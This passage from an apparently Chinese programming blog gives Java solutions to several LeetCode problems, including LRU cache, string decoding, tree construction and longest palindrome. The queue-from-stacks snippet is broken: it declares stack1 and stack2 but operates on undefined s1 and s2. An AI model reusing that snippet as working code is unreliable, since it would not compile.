&#123;</span><br><span class="line">            <span class="keyword">long</span> curr = heap.poll();</span><br><span class="line">            ugly = (<span class="keyword">int</span>) curr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> factor : factors) &#123;</span><br><span class="line">                <span class="keyword">long</span> next = curr * factor;</span><br><span class="line">                <span class="keyword">if</span> (seen.add(next)) &#123;</span><br><span class="line">                    heap.offer(next);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ugly;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串解码"><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">decodeString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Deque&lt;Integer&gt; times = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        Deque&lt;String&gt; previousStrings = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        <span class="comment">//暂存"["后面的字母</span></span><br><span class="line">        String res = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">//记录"["前面的数字</span></span><br><span class="line">        <span class="keyword">int</span> time = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c : s.toCharArray())&#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.isDigit(c))&#123;</span><br><span class="line">                time = time * <span class="number">10</span> + Integer.parseInt(c + <span class="string">""</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">'['</span>)&#123;</span><br><span class="line">                times.push(time);</span><br><span class="line">                previousStrings.push(res);</span><br><span class="line">                <span class="comment">//重置 </span></span><br><span class="line">                time = <span class="number">0</span>;</span><br><span class="line">                res = <span class="string">""</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">']'</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> currentTime = times.pop();</span><br><span class="line">                String previousString = previousStrings.pop();</span><br><span class="line">                <span class="keyword">while</span>(currentTime &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    previousString += res;</span><br><span class="line">                    currentTime--;</span><br><span class="line">                &#125;</span><br><span class="line">                res = previousString;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res += c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="用-Rand7-实现-Rand10"><a href="#用-Rand7-实现-Rand10" class="headerlink" title="用 Rand7() 实现 Rand10()"></a><a href="https://leetcode-cn.com/problems/implement-rand10-using-rand7/" target="_blank" rel="noopener">用 Rand7() 实现 Rand10()</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> <span class="keyword">extends</span> <span class="title">SolBase</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rand10</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row, col, idx;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            row = rand7();</span><br><span class="line">            col = rand7();</span><br><span class="line">            idx = col + (row - <span class="number">1</span>) * <span class="number">7</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (idx &gt; <span class="number">40</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + (idx - <span class="number">1</span>) % <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LRU缓存机制"><a href="#LRU缓存机制" class="headerlink" title="LRU缓存机制"></a>LRU缓存机制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DLinkedNode</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> key;</span><br><span class="line">        <span class="keyword">int</span> value;</span><br><span class="line">        DLinkedNode prev;</span><br><span class="line">        DLinkedNode next;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DLinkedNode</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DLinkedNode</span><span class="params">(<span class="keyword">int</span> _key, <span class="keyword">int</span> _value)</span> </span>&#123;key = _key; value = _value;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, DLinkedNode&gt; cache = <span class="keyword">new</span> HashMap&lt;Integer, DLinkedNode&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> DLinkedNode head, tail;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        <span class="comment">// 使用伪头部和伪尾部节点</span></span><br><span class="line">        head = <span class="keyword">new</span> DLinkedNode();</span><br><span class="line">        tail = <span class="keyword">new</span> DLinkedNode();</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        DLinkedNode node = cache.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果 key 存在，先通过哈希表定位，再移到头部</span></span><br><span class="line">        moveToHead(node);</span><br><span class="line">        <span class="keyword">return</span> node.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        DLinkedNode node = cache.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果 key 不存在，创建一个新的节点</span></span><br><span class="line">            DLinkedNode newNode = <span class="keyword">new</span> DLinkedNode(key, value);</span><br><span class="line">            <span class="comment">// 添加进哈希表</span></span><br><span class="line">            cache.put(key, newNode);</span><br><span class="line">            <span class="comment">// 添加至双向链表的头部</span></span><br><span class="line">            addToHead(newNode);</span><br><span class="line">            ++size;</span><br><span class="line">            <span class="keyword">if</span> (size &gt; capacity) &#123;</span><br><span class="line">                <span class="comment">// 如果超出容量，删除双向链表的尾部节点</span></span><br><span class="line">                DLinkedNode tail = removeTail();</span><br><span class="line">                <span class="comment">// 删除哈希表中对应的项</span></span><br><span class="line">                cache.remove(tail.key);</span><br><span class="line">                --size;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果 key 存在，先通过哈希表定位，再修改 value，并移到头部</span></span><br><span class="line">            node.value = value;</span><br><span class="line">            moveToHead(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addToHead</span><span class="params">(DLinkedNode node)</span> </span>&#123;</span><br><span class="line">        node.prev = head;</span><br><span class="line">        node.next = head.next;</span><br><span class="line">        head.next.prev = node;</span><br><span class="line">        head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeNode</span><span class="params">(DLinkedNode node)</span> </span>&#123;</span><br><span class="line">        node.prev.next = node.next;</span><br><span class="line">        node.next.prev = node.prev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">moveToHead</span><span class="params">(DLinkedNode node)</span> </span>&#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> DLinkedNode <span class="title">removeTail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        DLinkedNode res = tail.prev;</span><br><span class="line">        removeNode(res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="从前序与中序遍历构造序列二叉树"><a href="#从前序与中序遍历构造序列二叉树" class="headerlink" title="从前序与中序遍历构造序列二叉树"></a>从前序与中序遍历构造序列二叉树</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> preLen = preorder.length;</span><br><span class="line">        <span class="keyword">int</span> inLen = inorder.length;</span><br><span class="line">        <span class="keyword">if</span>(preLen != inLen)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span>  RuntimeException(<span class="string">"Incorrect input data."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;(preLen);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; inLen; i++)&#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buildTree(preorder, <span class="number">0</span>, preLen - <span class="number">1</span>, map, <span class="number">0</span>, inLen - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span> preLeft, <span class="keyword">int</span> preRight, Map&lt;Integer,Integer&gt;map, <span class="keyword">int</span> inLeft, <span class="keyword">int</span> inRight)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preLeft &gt; preRight || inLeft &gt; inRight)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> rootVal = preorder[preLeft];</span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(rootVal);</span><br><span class="line">        <span class="keyword">int</span> pIndex = map.get(rootVal);</span><br><span class="line">        root.left = buildTree(preorder, preLeft + <span class="number">1</span>, pIndex - inLeft + preLeft, map, inLeft, pIndex-<span class="number">1</span>);</span><br><span class="line">        root.right = buildTree(preorder, pIndex - inLeft + preLeft + <span class="number">1</span>, preRight, map, pIndex + <span class="number">1</span>, inRight);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除链表的倒数第N个节点"><a href="#删除链表的倒数第N个节点" class="headerlink" title="删除链表的倒数第N个节点"></a>删除链表的倒数第N个节点</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>, head);</span><br><span class="line">        ListNode first = head;</span><br><span class="line">        ListNode second = dummy;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            first = first.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (first != <span class="keyword">null</span>) &#123;</span><br><span class="line">            first = first.next;</span><br><span class="line">            second = second.next;</span><br><span class="line">        &#125;</span><br><span class="line">        second.next = second.next.next;</span><br><span class="line">        ListNode ans = dummy.next;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="按序打印"><a href="#按序打印" class="headerlink" title="按序打印"></a>按序打印</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> AtomicInteger firstJobDone = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">private</span> AtomicInteger secondJobDone = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// printFirst.run() outputs "first".</span></span><br><span class="line">    printFirst.run();</span><br><span class="line">    <span class="comment">// mark the first job as done, by increasing its count.</span></span><br><span class="line">    firstJobDone.incrementAndGet();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (firstJobDone.get() != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// waiting for the first job to be done.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printSecond.run() outputs "second".</span></span><br><span class="line">    printSecond.run();</span><br><span class="line">    <span class="comment">// mark the second as done, by increasing its count.</span></span><br><span class="line">    secondJobDone.incrementAndGet();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (secondJobDone.get() != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// waiting for the second job to be done.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printThird.run() outputs "third".</span></span><br><span class="line">    printThird.run();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="用栈实现队列"><a href="#用栈实现队列" class="headerlink" title="用栈实现队列"></a>用栈实现队列</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> front;</span><br><span class="line">Stack&lt;Integer&gt; stack1;</span><br><span class="line">Stack&lt;Integer&gt; stack2;</span><br><span class="line"><span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    stack1 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    stack2 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s1.empty())</span><br><span class="line">        front = x;</span><br><span class="line">    <span class="keyword">while</span> (!s1.isEmpty())</span><br><span class="line">        s2.push(s1.pop());</span><br><span class="line">    s2.push(x);</span><br><span class="line">    <span class="keyword">while</span> (!s2.isEmpty())</span><br><span class="line">        s1.push(s2.pop());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Removes the element from the front of queue.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    s1.pop();</span><br><span class="line">    <span class="keyword">if</span> (!s1.empty())</span><br><span class="line">        front = s1.peek();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Return whether the queue is empty.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s1.isEmpty();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Get the front element.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> front;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// dp[i][j] 表示 s[i..j] 是否是回文串</span></span><br><span class="line">        <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[len][len];</span><br><span class="line">        <span class="comment">// 初始化：所有长度为 1 的子串都是回文串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i][i] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="comment">// 递推开始</span></span><br><span class="line">        <span class="comment">// 先枚举子串长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> L = <span class="number">2</span>; L &lt;= len; L++) &#123;</span><br><span class="line">            <span class="comment">// 枚举左边界，左边界的上限设置可以宽松一些</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                <span class="comment">// 由 L 和 i 可以确定右边界，即 j - i + 1 = L 得</span></span><br><span class="line">                <span class="keyword">int</span> j = L + i - <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果右边界越界，就可以退出当前循环</span></span><br><span class="line">                <span class="keyword">if</span> (j &gt;= len) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (charArray[i] != charArray[j]) &#123;</span><br><span class="line">                    dp[i][j] = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="keyword">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        dp[i][j] = dp[i + <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 只要 dp[i][L] == true 成立，就表示子串 s[i..L] 是回文，此时记录回文长度和起始位置</span></span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; maxLen) &#123;</span><br><span class="line">                    maxLen = j - i + <span class="number">1</span>;</span><br><span class="line">                    begin = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(begin, begin + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="比较版本号"><a href="#比较版本号" class="headerlink" title="比较版本号"></a>比较版本号</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareVersion</span><span class="params">(String version1, String version2)</span> 